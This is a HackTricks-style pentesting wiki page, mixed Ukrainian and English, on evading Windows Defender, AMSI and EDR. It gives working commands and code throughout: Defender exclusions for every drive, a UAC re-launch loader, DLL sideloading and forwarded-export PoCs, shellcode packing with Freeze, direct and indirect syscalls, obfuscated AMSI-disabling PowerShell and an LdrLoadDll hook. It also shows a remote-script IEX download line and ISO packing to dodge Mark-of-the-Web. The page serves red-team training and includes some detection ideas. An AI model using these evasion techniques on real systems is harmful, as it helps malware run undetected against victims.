# Обхід антивірусів (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Цю сторінку спочатку написав** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Зупинити Defender

- [defendnot](https://github.com/es3n1n/defendnot): Інструмент для припинення роботи Windows Defender.
- [no-defender](https://github.com/es3n1n/no-defender): Інструмент для припинення роботи Windows Defender шляхом імітації іншого AV.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

### Installer-style UAC bait before tampering with Defender

Публічні лоадери, що маскуються під game cheats, часто поширюються як непідписані Node.js/Nexe інсталятори, які спочатку **просять у користувача підвищення прав** і лише потім нейтралізують Defender. Послідовність проста:

1. Перевіряють наявність адміністративного контексту за допомогою `net session`. Команда успішно виконується лише якщо виконавець має права адміністратора, тож помилка вказує, що лоадер запущений як звичайний користувач.
2. Негайно перезапускає себе з `RunAs` verb, щоб викликати очікуваний запит згоди UAC, зберігаючи початковий командний рядок.
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
Жертви вже вірять, що встановлюють “cracked” software, тож запит зазвичай приймається, надаючи malware права, необхідні для зміни політики Defender.

### Глобальні виключення `MpPreference` для кожної літери диска

Після підвищення привілеїв, ланцюжки в стилі GachiLoader максимізують сліпі зони Defender замість того, щоб одразу відключати сервіс. Лоадер спочатку вбиває GUI watchdog (`taskkill /F /IM SecHealthUI.exe`) і потім накладає **надзвичайно широкі виключення**, тож кожний профіль користувача, системний каталог і знімний диск стають недоступними для сканування:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Key observations:

- The loop walks every mounted filesystem (D:\, E:\, USB sticks, etc.) so **any future payload dropped anywhere on disk is ignored**.
- The `.sys` extension exclusion is forward-looking—attackers reserve the option to load unsigned drivers later without touching Defender again.
- All changes land under `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, letting later stages confirm the exclusions persist or expand them without re-triggering UAC.

Because no Defender service is stopped, наївні перевірки стану продовжують повідомляти “antivirus active”, навіть якщо реальне сканування в реальному часі ніколи не торкається цих шляхів.

## **AV Evasion Methodology**

Currently, AVs use different methods for checking if a file is malicious or not, static detection, dynamic analysis, and for the more advanced EDRs, behavioural analysis.

### **Static detection**

Static detection досягається шляхом позначення відомих шкідливих рядків або масивів байтів у binary або script, а також витягання інформації з самого файлу (наприклад, file description, company name, digital signatures, icon, checksum тощо). Це означає, що використання відомих публічних інструментів може значно підвищити ймовірність виявлення, оскільки їх, ймовірно, вже проаналізували й позначили як шкідливі. Є кілька способів обійти подібне виявлення:

- **Encryption**

Якщо ви зашифруєте binary, AV не зможе його виявити, але вам знадобиться якийсь loader, щоб розшифрувати й запустити програму в пам'яті.

- **Obfuscation**

Іноді достатньо змінити кілька рядків у binary або script, щоб пройти повз AV, проте це може зайняти багато часу залежно від того, що саме ви намагаєтесь обфускувати.

- **Custom tooling**

Якщо ви розробите власні інструменти, не буде відомих сигнатур, але це потребує багато часу і зусиль.

> [!TIP]
> Хороший спосіб перевірити статичне виявлення Windows Defender — це [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Він фактично розбиває файл на кілька сегментів і потім просить Defender просканувати кожен сегмент окремо; таким чином можна точно зрозуміти, які рядки або байти позначені у вашому binary.

Я дуже рекомендую переглянути цей [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) про практичний AV Evasion.

### **Dynamic analysis**

Dynamic analysis — це коли AV запускає ваш binary у sandbox і спостерігає за шкідливою активністю (наприклад, спроби розшифрувати і прочитати паролі браузера, виконати minidump на LSASS тощо). Ця частина може бути трохи складнішою, але ось кілька прийомів для обходу sandbox.

- **Sleep before execution** Залежно від реалізації, це може бути відмінним способом обійти dynamic analysis AV. AV мають дуже мало часу на сканування файлів, щоб не заважати роботі користувача, тож використання довгих пауз може порушити аналіз binaries. Проблема в тому, що багато sandbox AV можуть просто пропустити sleep залежно від реалізації.
- **Checking machine's resources** Зазвичай sandbox має дуже обмежені ресурси (наприклад, < 2GB RAM), інакше вони могли б уповільнювати машину користувача. Тут можна бути креативним — наприклад, перевіряти температуру CPU або навіть швидкість вентиляторів; не все реалізовано в sandbox.
- **Machine-specific checks** Якщо ви хочете таргетувати користувача, чиїй робочій станції приєднано домен "contoso.local", ви можете перевірити домен комп'ютера — якщо він не співпадає, програма може завершити роботу.

Виявилось, що computername Microsoft Defender's Sandbox — HAL9TH, тож ви можете перевірити ім'я комп'ютера у вашому malware перед детонацією; якщо ім'я співпадає з HAL9TH, це означає, що ви всередині Defender's sandbox, і можна завершити виконання.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>джерело: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Декілька інших дуже корисних порад від [@mgeeky](https://twitter.com/mariuszbit) для протидії Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Як ми вже казали раніше, **public tools** рано чи пізно **будуть виявлені**, тож вам слід поставити собі питання:

Наприклад, якщо ви хочете дампити LSASS, **чи дійсно вам потрібно використовувати mimikatz**? Чи можна знайти інший, менш відомий проєкт, який теж дампить LSASS.

Правильна відповідь, ймовірно, остання. Беручи mimikatz як приклад, це, мабуть, один з найпоміченіших інструментів AV та EDR; хоча проєкт крутий, працювати з ним, щоб обходити AV, — справжній кошмар, тож шукайте альтернативи для досягнення вашої мети.

> [!TIP]
> Коли ви модифікуєте payloads для уникнення виявлення, обов'язково **вимкніть автоматичну відправку зразків** у Defender, і, серйозно, **DO NOT UPLOAD TO VIRUSTOTAL**, якщо ваша мета — довготривала евазія. Якщо хочете перевірити, чи ваш payload виявляється певним AV, встановіть його на VM, спробуйте вимкнути автоматичну відправку зразків і тестуйте там, поки не будете задоволені результатом.

## EXEs vs DLLs

Whenever it's possible, always **prioritize using DLLs for evasion**, in my experience, DLL files are usually **way less detected** and analyzed, so it's a very simple trick to use in order to avoid detection in some cases (if your payload has some way of running as a DLL of course).

As we can see in this image, a DLL Payload from Havoc has a detection rate of 4/26 in antiscan.me, while the EXE payload has a 7/26 detection rate.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

Now we'll show some tricks you can use with DLL files to be much more stealthier.

## DLL Sideloading & Proxying

**DLL Sideloading** takes advantage of the DLL search order used by the loader by positioning both the victim application and malicious payload(s) alongside each other.

You can check for programs susceptible to DLL Sideloading using [Siofra](https://github.com/Cybereason/siofra) and the following powershell script:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Ця команда виведе список програм, уразливих до DLL hijacking всередині "C:\Program Files\\" та DLL-файлів, які вони намагаються завантажити.

Я настійно рекомендую вам **explore DLL Hijackable/Sideloadable programs yourself**, ця техніка досить stealthy при правильному виконанні, але якщо ви використовуєте публічно відомі DLL Sideloadable programs, вас можуть легко виявити.

Просте розміщення шкідливого DLL з іменем, яке програма очікує завантажити, не обов'язково завантажить ваш payload, оскільки програма очікує певні функції всередині того DLL. Щоб вирішити цю проблему, ми використаємо іншу техніку, звану **DLL Proxying/Forwarding**.

**DLL Proxying** переадресовує виклики, які програма робить, із proxy (й шкідливого) DLL до оригінального DLL, таким чином зберігаючи функціональність програми та дозволяючи виконати ваш payload.

Я буду використовувати проект [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) від [@flangvik](https://twitter.com/Flangvik/)

Ось кроки, які я виконав:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Остання команда дасть нам 2 файли: шаблон вихідного коду DLL та оригінальну перейменовану DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
Це результати:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

І наше shellcode (закодований за допомогою [SGN](https://github.com/EgeBalci/sgn)) і proxy DLL мають рівень виявлення 0/26 на [antiscan.me](https://antiscan.me)! Назвав би це успіхом.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Я **категорично рекомендую** переглянути [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) про DLL Sideloading та також [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE), щоб дізнатися більше про те, що ми обговорювали детальніше.

### Зловживання Forwarded Exports (ForwardSideLoading)

Windows PE modules можуть експортувати функції, які фактично є "forwarders": замість вказівки на код, запис експорту містить ASCII-рядок у формі `TargetDll.TargetFunc`. Коли викликач розв'язує (resolves) цей експорт, Windows loader виконає:

- Завантажить `TargetDll`, якщо він ще не завантажений
- Визначить `TargetFunc` з нього

Основні особливості, які варто розуміти:
- Якщо `TargetDll` є KnownDLL, він постачається з захищеного простору імен KnownDLLs (наприклад, ntdll, kernelbase, ole32).
- Якщо `TargetDll` не є KnownDLL, використовується звичайний порядок пошуку DLL, який включає директорію модуля, що виконує forward resolution.

Це дозволяє непрямий примітив sideloading: знайти підписаний DLL, який експортує функцію, перенаправлену на ім'я модуля, що не є KnownDLL, потім розмістити цей підписаний DLL поряд із керованим нападником DLL з точно таким самим ім'ям, як цільовий перенаправлений модуль. Коли викликається перенаправлений експорт, loader розв'язує forward і завантажує ваш DLL з тієї ж директорії, виконуючи ваш DllMain.

Приклад, спостережений у Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` не є KnownDLL, тому вона завантажується за звичайним порядком пошуку.

PoC (copy-paste):
1) Скопіюйте підписану системну DLL у папку з правами запису
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Помістіть шкідливий `NCRYPTPROV.dll` у ту ж папку. Мінімальний DllMain достатній, щоб отримати виконання коду; вам не потрібно реалізовувати переспрямовану функцію, щоб викликати DllMain.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Спровокувати пересилання за допомогою підписаного LOLBin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Observed behavior:
- rundll32 (підписаний) завантажує side-by-side `keyiso.dll` (підписаний)
- Під час вирішення `KeyIsoSetAuditingInterface` завантажувач слідує за переадресацією до `NCRYPTPROV.SetAuditingInterface`
- Потім завантажувач завантажує `NCRYPTPROV.dll` з `C:\test` і виконує його `DllMain`
- Якщо `SetAuditingInterface` не реалізовано, ви отримаєте помилку "missing API" тільки після того, як `DllMain` вже виконався

Hunting tips:
- Зосередьтеся на переадресованих експортaх, де цільовий модуль не є KnownDLL. KnownDLLs перелічені в гілці `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Ви можете перерахувати переадресовані експорти за допомогою інструментів, таких як:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Перегляньте інвентар forwarderів Windows 11, щоб знайти кандидатів: https://hexacorn.com/d/apis_fwd.txt

Ідеї виявлення/захисту:
- Monitor LOLBins (наприклад, rundll32.exe), які завантажують підписані DLL з не-системних шляхів, а потім завантажують non-KnownDLLs з тим же базовим ім'ям з цього каталогу
- Сигналізувати про ланцюжки процесів/модулів, такі як: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` під шляхами, доступними для запису користувачем
- Застосовувати політики цілісності коду (WDAC/AppLocker) і забороняти write+execute у каталогах додатків

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Ви можете використовувати Freeze для завантаження та виконання вашого shellcode у прихований спосіб.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Уникнення виявлення — це гра кішки й миші: те, що працює сьогодні, може бути виявлено завтра, тож ніколи не покладайтеся лише на один інструмент; по можливості комбінуйте кілька методів обходу.

## Direct/Indirect Syscalls & SSN Resolution (SysWhispers4)

EDRs часто розміщують **user-mode inline hooks** на `ntdll.dll` syscall stubs. Щоб обійти ці хуки, можна згенерувати **direct** або **indirect** syscall stubs, які завантажують правильний **SSN** (номер системної служби) і переходять у режим ядра, не виконуючи загачений (hooked) експортний точковий вхід.

**Опції виклику:**
- **Direct (embedded)**: emit a `syscall`/`sysenter`/`SVC #0` instruction in the generated stub (no `ntdll` export hit).
- **Indirect**: jump into an existing `syscall` gadget inside `ntdll` so the kernel transition appears to originate from `ntdll` (useful for heuristic evasion); **randomized indirect** picks a gadget from a pool per call.
- **Egg-hunt**: avoid embedding the static `0F 05` opcode sequence on disk; resolve a syscall sequence at runtime.

**Стратегії визначення SSN, стійкі до хукінгу:**
- **FreshyCalls (VA sort)**: infer SSNs by sorting syscall stubs by virtual address instead of reading stub bytes.
- **SyscallsFromDisk**: map a clean `\KnownDlls\ntdll.dll`, read SSNs from its `.text`, then unmap (bypasses all in-memory hooks).
- **RecycledGate**: combine VA-sorted SSN inference with opcode validation when a stub is clean; fall back to VA inference if hooked.
- **HW Breakpoint**: set DR0 on the `syscall` instruction and use a VEH to capture the SSN from `EAX` at runtime, without parsing hooked bytes.

Example SysWhispers4 usage:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```
## AMSI (Anti-Malware Scan Interface)

AMSI було створено, щоб запобігти "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Спочатку AV могли сканувати лише **файли на диску**, тож якщо ви якимось чином виконували payloads **безпосередньо в пам'яті**, AV нічого не міг зробити, бо не мав достатньої видимості.

Функція AMSI інтегрована в такі компоненти Windows.

- User Account Control, or UAC (підвищення прав для EXE, COM, MSI або інсталяції ActiveX)
- PowerShell (скрипти, інтерактивне використання та динамічна оцінка коду)
- Windows Script Host (wscript.exe та cscript.exe)
- JavaScript and VBScript
- Office VBA macros

Вона дозволяє антивірусним рішенням інспектувати поведінку скриптів, надаючи вміст скриптів у формі, яка є нешифрованою і не обфускованою.

Запуск `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` спричинить таке сповіщення у Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Зверніть увагу, що воно додає префікс `amsi:` і потім шлях до виконуваного файлу, з якого запустився скрипт, в цьому випадку powershell.exe

Ми не скидали жодного файлу на диск, але все одно потрапили у виявлення в пам'яті через AMSI.

Крім того, починаючи з **.NET 4.8**, C# код також проходить через AMSI. Це навіть впливає на `Assembly.Load(byte[])` для завантаження та виконання в пам'яті. Тому для виконання в пам'яті з метою обходу AMSI рекомендується використовувати нижчі версії .NET (наприклад, 4.7.2 або нижче).

Існує кілька способів обійти AMSI:

- **Obfuscation**

Оскільки AMSI здебільшого працює зі статичними сигнатурами, зміна скриптів, які ви намагаєтесь завантажити, може бути хорошим способом уникнути виявлення.

Однак AMSI має можливість деобфускувати скрипти навіть якщо вони мають кілька шарів, тож обфускація може бути поганим варіантом залежно від того, як вона зроблена. Це робить ухилення не таким вже й простим. Хоча іноді достатньо змінити кілька імен змінних — і все буде гаразд, тож все залежить від того, наскільки щось було позначено.

- **AMSI Bypass**

Оскільки AMSI реалізовано шляхом завантаження DLL у процес powershell (а також cscript.exe, wscript.exe тощо), з ним можна легко маніпулювати навіть виконуючися від імені непривілейованого користувача. Через цю недосконалість реалізації AMSI дослідники знайшли кілька способів уникнути сканування AMSI.

**Forcing an Error**

Примусове відмовлення ініціалізації AMSI (amsiInitFailed) призведе до того, що для поточного процесу сканування ініційовано не буде. Спочатку це розкрив [Matt Graeber](https://twitter.com/mattifestation), і Microsoft розробила сигнатуру, щоб запобігти широкому використанню.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Було достатньо одного рядка коду powershell, щоб зробити AMSI непридатним для поточного процесу powershell. Цей рядок, звісно, був позначений самим AMSI, тому для використання цієї техніки потрібні певні модифікації.

Ось змінений AMSI bypass, який я взяв з цього [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Keep in mind, that this will probably get flagged once this post comes out, so you should not publish any code if your plan is staying undetected.

**Memory Patching**

This technique was initially discovered by [@RastaMouse](https://twitter.com/_RastaMouse/) and it involves finding address for the "AmsiScanBuffer" function in amsi.dll (responsible for scanning the user-supplied input) and overwriting it with instructions to return the code for E_INVALIDARG, this way, the result of the actual scan will return 0, which is interpreted as a clean result.

> [!TIP]
> Please read [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) for a more detailed explanation.

There are also many other techniques used to bypass AMSI with powershell, check out [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) and [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) to learn more about them.

### Блокування AMSI шляхом запобігання завантаженню amsi.dll (LdrLoadDll hook)

AMSI is initialised only after `amsi.dll` is loaded into the current process. A robust, language‑agnostic bypass is to place a user‑mode hook on `ntdll!LdrLoadDll` that returns an error when the requested module is `amsi.dll`. As a result, AMSI never loads and no scans occur for that process.

Implementation outline (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Примітки
- Працює як у PowerShell, так і у WScript/CScript та власних лоадерах (усе, що інакше завантажило б AMSI).
- Комбінуйте з передачею скриптів через stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`), щоб уникнути довгих артефактів командного рядка.
- Спостерігалося використання у лоадерах, що виконуються через LOLBins (наприклад, `regsvr32`, який викликає `DllRegisterServer`).

Інструмент **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** також генерує скрипт для обходу AMSI.
Інструмент **[https://amsibypass.com/](https://amsibypass.com/)** також генерує скрипти для обходу AMSI, що уникають сигнатур шляхом рандомізації користувацьких функцій, змінних, виразів символів і застосування випадкового регістру символів до ключових слів PowerShell для уникнення сигнатур.

**Видалити виявлену сигнатуру**

Ви можете використати інструменти, такі як **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** та **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)**, щоб видалити виявлену сигнатуру AMSI з пам'яті поточного процесу. Цей інструмент сканує пам'ять поточного процесу на наявність сигнатури AMSI, після чого перезаписує її інструкціями NOP, фактично видаляючи її з пам'яті.

**AV/EDR продукти, які використовують AMSI**

Список AV/EDR продуктів, що використовують AMSI, можна знайти в **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Використовуйте PowerShell версії 2**
Якщо використовувати PowerShell версії 2, AMSI не завантажиться, тож ви зможете виконувати свої скрипти без їхнього сканування AMSI. Можна зробити так:
```bash
powershell.exe -version 2
```
## PS логування

PowerShell logging — це функція, яка дозволяє записувати всі PowerShell команди, виконані в системі. Це може бути корисно для аудиту та усунення неполадок, але також може бути **проблемою для атакуючих, які хочуть уникнути виявлення**.

Щоб обійти PowerShell logging, можна використати такі техніки:

- **Disable PowerShell Transcription and Module Logging**: Ви можете використовувати інструмент, такий як [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) для цієї мети.
- **Use Powershell version 2**: Якщо ви використовуєте PowerShell версії 2, AMSI не буде завантажено, тож ви зможете запускати скрипти без сканування AMSI. Можна зробити так: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: Використовуйте [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) щоб створити PowerShell без захисту (це те, що використовує `powerpick` з Cobal Strike).


## Обфускація

> [!TIP]
> Кілька технік обфускації покладаються на шифрування даних, що підвищує ентропію бінарного файлу і полегшує його виявлення AVs та EDRs. Будьте обережні з цим і, можливо, застосовуйте шифрування лише до конкретних частин коду, які є чутливими або повинні бути приховані.

### Deobfuscating ConfuserEx-Protected .NET Binaries

При аналізі malware, що використовує ConfuserEx 2 (або комерційні форки), часто зустрічається декілька шарів захисту, які блокують декомпілятори та sandbox-и. Нижче наведений робочий процес надійно **відновлює майже оригінальний IL**, який потім можна декомпілювати в C# за допомогою інструментів на кшталт dnSpy або ILSpy.

1.  Anti-tampering removal – ConfuserEx encrypts every *method body* and decrypts it inside the *module* static constructor (`<Module>.cctor`).  This also patches the PE checksum so any modification will crash the binary.  Use **AntiTamperKiller** to locate the encrypted metadata tables, recover the XOR keys and rewrite a clean assembly:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Output contains the 6 anti-tamper parameters (`key0-key3`, `nameHash`, `internKey`) that can be useful when building your own unpacker.

2.  Symbol / control-flow recovery – feed the *clean* file to **de4dot-cex** (a ConfuserEx-aware fork of de4dot).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – select the ConfuserEx 2 profile
• de4dot will undo control-flow flattening, restore original namespaces, classes and variable names and decrypt constant strings.

3.  Proxy-call stripping – ConfuserEx replaces direct method calls with lightweight wrappers (a.k.a *proxy calls*) to further break decompilation.  Remove them with **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
After this step you should observe normal .NET API such as `Convert.FromBase64String` or `AES.Create()` instead of opaque wrapper functions (`Class8.smethod_10`, …).

4.  Manual clean-up – run the resulting binary under dnSpy, search for large Base64 blobs or `RijndaelManaged`/`TripleDESCryptoServiceProvider` use to locate the *real* payload.  Often the malware stores it as a TLV-encoded byte array initialised inside `<Module>.byte_0`.

The above chain restores execution flow **without** needing to run the malicious sample – useful when working on an offline workstation.

> 🛈  ConfuserEx produces a custom attribute named `ConfusedByAttribute` that can be used as an IOC to automatically triage samples.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: obфускатор для C#**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Мета цього проєкту — надати open-source форк [LLVM](http://www.llvm.org/) набора для компіляції, здатний підвищити безпеку програмного забезпечення через [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) та захист від підробки.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator демонструє, як використовувати мову `C++11/14` для генерації на час компіляції обфускованого коду без використання зовнішніх інструментів і без модифікації компілятора.
- [**obfy**](https://github.com/fritzone/obfy): Додає шар обфускованих операцій, згенерованих фреймворком метапрограмування шаблонів C++, що трохи ускладнить життя тому, хто захоче зламати застосунок.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz — x64 бінарний обфускатор, здатний обфускувати різні PE-файли, включаючи: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame — простий движок метаморфного коду для довільних виконуваних файлів.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator — тонкозерниста система обфускації коду для мов, що підтримуються LLVM, яка використовує ROP (return-oriented programming). ROPfuscator обфускує програму на рівні асемблерного коду, перетворюючи звичайні інструкції в ROP-ланцюги, порушуючи звичне уявлення про нормальний контроль потоку.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt — .NET PE Crypter, написаний на Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor здатен конвертувати існуючі EXE/DLL у shellcode і потім їх завантажувати

## SmartScreen & MoTW

Ви могли бачити цей екран під час завантаження деяких виконуваних файлів з інтернету і їх запуску.

Microsoft Defender SmartScreen — це механізм безпеки, призначений для захисту кінцевого користувача від запуску потенційно шкідливих застосунків.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen переважно працює на основі підходу, заснованого на репутації: рідко завантажувані застосунки викликають спрацьовування SmartScreen, попереджаючи і перешкоджаючи користувачу виконати файл (хоча файл все ще можна виконати, натиснувши More Info -> Run anyway).

**MoTW** (Mark of The Web) — це [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) з ім'ям Zone.Identifier, який автоматично створюється при завантаженні файлів з інтернету, разом із URL, звідки вони були завантажені.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Перевірка Zone.Identifier ADS для файлу, завантаженого з інтернету.</p></figcaption></figure>

> [!TIP]
> Важливо зазначити, що виконувані файли, підписані **довіреним** сертифікатом підпису, **не викличуть спрацьовування SmartScreen**.

Дуже ефективний спосіб запобігти отриманню вашими payloads Mark of The Web — упакувати їх усередині якогось контейнера, наприклад ISO. Це відбувається тому, що Mark-of-the-Web (MOTW) **не може** бути застосований до **non NTFS** томів.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) — інструмент, який пакує payloads у вихідні контейнери, щоб обійти Mark-of-the-Web.

Приклад використання:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
